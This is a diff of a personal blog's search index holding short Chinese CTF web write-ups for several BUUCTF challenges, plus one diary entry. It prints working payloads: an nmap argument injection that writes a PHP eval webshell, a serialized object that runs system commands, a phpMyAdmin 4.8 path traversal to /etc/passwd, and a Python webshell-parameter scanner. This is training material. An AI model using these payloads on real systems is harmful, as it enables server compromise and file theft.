+    <content><![CDATA[<h1 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h1><p>利用了namp一个参数，将一句话写入文件，rce</p>
+<p>同时escapeshellarg()和escapeshellcmd()同时出现会有bug</p>
+<pre><code>pyload:?host=&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php&#39;
 </code></pre>
-]]></content>
+<h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
       <categories>
         <category>ctf每日一题</category>
       </categories>
       <tags>
         <tag>ctf</tag>
         <tag>web</tag>
-        <tag>反序列化</tag>
-        <tag>SSTI</tag>
+        <tag>rce</tag>
+        <tag>命令执行</tag>
       </tags>
   </entry>
   <entry>
@@ -958,6 +925,39 @@ Submit
       </tags>
   </entry>
   <entry>
+    <title>20210927</title>
+    <url>/posts/5106ce6b/</url>
+    <content><![CDATA[<h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><blockquote>
+<p>php模板注入</p>
+</blockquote>
+<p>php存在模板注入漏洞，不仅python有，php也有</p>
+<p>该题是通过xff的方式获取的本机ip，在这里测试是否有模板注入，测试49，能执行说明存在，然后cat /flag就行，本来打算反弹个shell玩玩呢，结果一个都不能用。</p>
+<h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><blockquote>
+<p>反序列化绕过</p>
+</blockquote>
+<p>这题本来也想反弹个shell，也是弹了半天没谈过来。。</p>
+<p>直接cat flag也没有，只能find命令了</p>
+<p>先抓包，怀疑可能有call_user_func，随便试了几个都被过滤了，file_get_contents没被禁，获取index.php源码，代码审计</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$disable_fun</span> = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>); <span class="comment"># 过滤了很多函数，剩了个file_get_contents没被禁</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = call_user_func(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        <span class="variable">$a</span>= gettype(<span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 可以利用反序列化漏洞</span></span><br><span class="line">    <span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;func&quot;</span>];</span><br><span class="line">    <span class="variable">$p</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$func</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="variable">$func</span> = strtolower(<span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>,<span class="variable">$disable_fun</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>写出exp</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;find / -name flag*&quot;</span>; <span class="comment"># 第一部</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;cat /tmp/flagoefiu4r93&quot;</span>; <span class="comment"># 第二部</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Test();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到pyload: </p>
+<pre><code>func=file_get_contents&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;
+</code></pre>
+]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>反序列化</tag>
+        <tag>SSTI</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>20211015</title>
     <url>/posts/2348a06e/</url>
     <content><![CDATA[<h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><blockquote>
@@ -973,6 +973,18 @@ Submit
 <p>然后成功获得cookie_secret，md5获得hash值即可</p>
 <p>在msg页面可以实现模板注入</p>
 ]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>20211018</title>
+    <url>/posts/5df9dcd3/</url>
+    <content><![CDATA[<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2>]]></content>
       <categories>
         <category>ctf每日一题</category>
       </categories>
@@ -1002,34 +1014,6 @@ Submit
         <tag>web</tag>
         <tag>文件上传</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>20211018</title>
-    <url>/posts/5df9dcd3/</url>
-    <content><![CDATA[<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2>]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>20211031</title>
-    <url>/posts/161306f5/</url>
-    <content><![CDATA[<p>失眠了，想了想不知道干什么</p>
-<p>刚开始玩了会古墓丽影，不想玩了</p>
-<p>想到前段时间服务器好像坏了，又修了修，重新在服务器上把博客搭好了</p>
-<p>现在博客Github上和服务器上的都能用</p>
-<p>之所以保留Github是因为足够稳定，用的是一级域名，<a href="https://haorical.xyz/">https://haorical.xyz</a></p>
-<p>服务器用的阿里云，国内比较快，用的二级域名，<a href="http://blog.haorical.xyz/">http://blog.haorical.xyz</a></p>
-<p>暂时没部署证书，以后再弄吧，现在不想弄了。</p>
-<p>又不知道干啥了，过两天生日，一点感觉都没有，明天还得复习线代还得打比赛。。。</p>
-]]></content>
-      <categories>
-        <category>随笔</category>
-      </categories>
   </entry>
   <entry>
     <title>20211117</title>
@@ -1063,6 +1047,22 @@ var_dump(file_get_contents(&quot;/flag&quot;));
       </tags>
   </entry>
   <entry>
+    <title>20211031</title>
+    <url>/posts/161306f5/</url>
+    <content><![CDATA[<p>失眠了，想了想不知道干什么</p>
+<p>刚开始玩了会古墓丽影，不想玩了</p>
+<p>想到前段时间服务器好像坏了，又修了修，重新在服务器上把博客搭好了</p>
+<p>现在博客Github上和服务器上的都能用</p>
+<p>之所以保留Github是因为足够稳定，用的是一级域名，<a href="https://haorical.xyz/">https://haorical.xyz</a></p>
+<p>服务器用的阿里云，国内比较快，用的二级域名，<a href="http://blog.haorical.xyz/">http://blog.haorical.xyz</a></p>
+<p>暂时没部署证书，以后再弄吧，现在不想弄了。</p>
+<p>又不知道干啥了，过两天生日，一点感觉都没有，明天还得复习线代还得打比赛。。。</p>
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
+  </entry>
+  <entry>
     <title>20211118</title>
     <url>/posts/5c3bb6e4/</url>
     <content><![CDATA[<h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p>上传.htaccess </p>
@@ -1078,49 +1078,6 @@ var_dump(file_get_contents(&quot;/flag&quot;));
 </code></pre>
 <h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p>xxe</p>
 ]]></content>
-  </entry>
-  <entry>
-    <title>20211129</title>
-    <url>/posts/11d5b1/</url>
-    <content><![CDATA[<h2 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h2><blockquote>
-<p>phpmyadmin 4.8 cve 文件包含漏洞</p>
-</blockquote>
-<pre><code>?target=db_sql.php%253f/../../../../../../etc/passwd
-</code></pre>
-<h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><p>学到了请求有get改成post</p>
-<p>点击help，发现报错，把get改为post，同时改后面参数，改成post上去</p>
-<pre><code>com.wm.ctf.DownloadController.doPost(DownloadController.java:24)
-</code></pre>
-<p>得到一个奇怪的包的目录</p>
-<p>看了下wp，java项目源码在WEB-INF中，构造pyload</p>
-<p>params需要加个filename=WEB-INF/classes/com/wm/ctf/FlagController.class 同时post filename就可以把class下下来</p>
-<h2 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2><p>把源码下下来，一共好几千个文件里面有我们需要的马，我们只需要一个一个试即可🥰</p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">print(<span class="string">&#x27;开始时间：  &#x27;</span>+  time.asctime( time.localtime(time.time()) ))</span><br><span class="line">s1=threading.Semaphore(<span class="number">100</span>)  							  			<span class="comment">#这儿设置最大的线程数</span></span><br><span class="line">filePath = <span class="string">r&quot;C:\Users\haodo\Desktop\20211129\高明黑客\src&quot;</span></span><br><span class="line">os.chdir(filePath)													<span class="comment">#改变当前的路径</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span>								<span class="comment">#设置重连次数，防止线程数过高，断开连接</span></span><br><span class="line">files = os.listdir(filePath)</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = <span class="literal">False</span>											 <span class="comment"># 设置连接活跃状态为False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_content</span>(<span class="params">file</span>):</span></span><br><span class="line">    s1.acquire()												</span><br><span class="line">    print(<span class="string">&#x27;trying   &#x27;</span>+file+ <span class="string">&#x27;     &#x27;</span>+ time.asctime( time.localtime(time.time()) ))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:							<span class="comment">#打开php文件，提取所有的$_GET和$_POST的参数</span></span><br><span class="line">            gets = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">            posts = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">    data = &#123;&#125;														<span class="comment">#所有的$_POST</span></span><br><span class="line">    params = &#123;&#125;														<span class="comment">#所有的$_GET</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> gets:</span><br><span class="line">        params[m] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> posts:</span><br><span class="line">        data[n] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    url = <span class="string">&#x27;http://fab0ef41-82a7-480e-a354-be549de9731f.node4.buuoj.cn:81/&#x27;</span>+file</span><br><span class="line">    req = session.post(url, data=data, params=params)			<span class="comment">#一次性请求所有的GET和POST</span></span><br><span class="line">    req.close()												<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">    req.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    content = req.text</span><br><span class="line">    <span class="comment">#print(content)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:									<span class="comment">#如果发现有可以利用的参数，继续筛选出具体的参数</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> gets:</span><br><span class="line">            req = session.get(url+<span class="string">&#x27;?%s=&#x27;</span>%a+<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()												<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                exit(<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> posts:</span><br><span class="line">                req = session.post(url, data=&#123;b:<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()												<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:													<span class="comment">#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span></span><br><span class="line">            param = a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            param = b</span><br><span class="line">        print(<span class="string">&#x27;找到了利用文件： &#x27;</span>+file+<span class="string">&quot;  and 找到了利用的参数：%s&quot;</span> %param)</span><br><span class="line">        print(<span class="string">&#x27;结束时间：  &#x27;</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files:															<span class="comment">#加入多线程</span></span><br><span class="line">   t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">   t.start()</span><br></pre></td></tr></table></figure>
-<p>需要先本地测试，找到马后直接服务器利用即可</p>
-<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>变量覆盖漏洞</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>好多payload:</p>
-<pre><code>yds=flag
-is=flag&amp;flag=flag
-</code></pre>
-<h2 id="Had-a-bad-day"><a href="#Had-a-bad-day" class="headerlink" title="Had a bad day"></a>Had a bad day</h2><p>php://filter应用</p>
-<p><a href="https://oatmeal.vip/security/web-learning/php-filter/">https://oatmeal.vip/security/web-learning/php-filter/</a></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> 	<span class="keyword">if</span>( strpos( <span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))</span><br><span class="line"><span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
-
-<p>构造:</p>
-<pre><code>php://filter/convert.base64-encode/write=woofers/resource=flag
-</code></pre>
-]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>代码审计</tag>
-        <tag>文件包含</tag>
-      </tags>
   </entry>
   <entry>
     <title>2021秋季赛部分wp</title>
@@ -1181,6 +1138,49 @@ is=flag&amp;flag=flag
       <tags>
         <tag>ctf</tag>
         <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>20211129</title>
+    <url>/posts/11d5b1/</url>
+    <content><![CDATA[<h2 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h2><blockquote>
+<p>phpmyadmin 4.8 cve 文件包含漏洞</p>
+</blockquote>
+<pre><code>?target=db_sql.php%253f/../../../../../../etc/passwd
+</code></pre>
+<h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><p>学到了请求有get改成post</p>
+<p>点击help，发现报错，把get改为post，同时改后面参数，改成post上去</p>
+<pre><code>com.wm.ctf.DownloadController.doPost(DownloadController.java:24)
+</code></pre>
+<p>得到一个奇怪的包的目录</p>
+<p>看了下wp，java项目源码在WEB-INF中，构造pyload</p>
+<p>params需要加个filename=WEB-INF/classes/com/wm/ctf/FlagController.class 同时post filename就可以把class下下来</p>
+<h2 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2><p>把源码下下来，一共好几千个文件里面有我们需要的马，我们只需要一个一个试即可🥰</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">print(<span class="string">&#x27;开始时间：  &#x27;</span>+  time.asctime( time.localtime(time.time()) ))</span><br><span class="line">s1=threading.Semaphore(<span class="number">100</span>)  							  			<span class="comment">#这儿设置最大的线程数</span></span><br><span class="line">filePath = <span class="string">r&quot;C:\Users\haodo\Desktop\20211129\高明黑客\src&quot;</span></span><br><span class="line">os.chdir(filePath)													<span class="comment">#改变当前的路径</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span>								<span class="comment">#设置重连次数，防止线程数过高，断开连接</span></span><br><span class="line">files = os.listdir(filePath)</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = <span class="literal">False</span>											 <span class="comment"># 设置连接活跃状态为False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_content</span>(<span class="params">file</span>):</span></span><br><span class="line">    s1.acquire()												</span><br><span class="line">    print(<span class="string">&#x27;trying   &#x27;</span>+file+ <span class="string">&#x27;     &#x27;</span>+ time.asctime( time.localtime(time.time()) ))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:							<span class="comment">#打开php文件，提取所有的$_GET和$_POST的参数</span></span><br><span class="line">            gets = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">            posts = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">    data = &#123;&#125;														<span class="comment">#所有的$_POST</span></span><br><span class="line">    params = &#123;&#125;														<span class="comment">#所有的$_GET</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> gets:</span><br><span class="line">        params[m] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> posts:</span><br><span class="line">        data[n] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    url = <span class="string">&#x27;http://fab0ef41-82a7-480e-a354-be549de9731f.node4.buuoj.cn:81/&#x27;</span>+file</span><br><span class="line">    req = session.post(url, data=data, params=params)			<span class="comment">#一次性请求所有的GET和POST</span></span><br><span class="line">    req.close()												<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">    req.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    content = req.text</span><br><span class="line">    <span class="comment">#print(content)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:									<span class="comment">#如果发现有可以利用的参数，继续筛选出具体的参数</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> gets:</span><br><span class="line">            req = session.get(url+<span class="string">&#x27;?%s=&#x27;</span>%a+<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()												<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                exit(<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> posts:</span><br><span class="line">                req = session.post(url, data=&#123;b:<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()												<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:													<span class="comment">#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span></span><br><span class="line">            param = a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            param = b</span><br><span class="line">        print(<span class="string">&#x27;找到了利用文件： &#x27;</span>+file+<span class="string">&quot;  and 找到了利用的参数：%s&quot;</span> %param)</span><br><span class="line">        print(<span class="string">&#x27;结束时间：  &#x27;</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files:															<span class="comment">#加入多线程</span></span><br><span class="line">   t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">   t.start()</span><br></pre></td></tr></table></figure>
+<p>需要先本地测试，找到马后直接服务器利用即可</p>
+<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>变量覆盖漏洞</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span 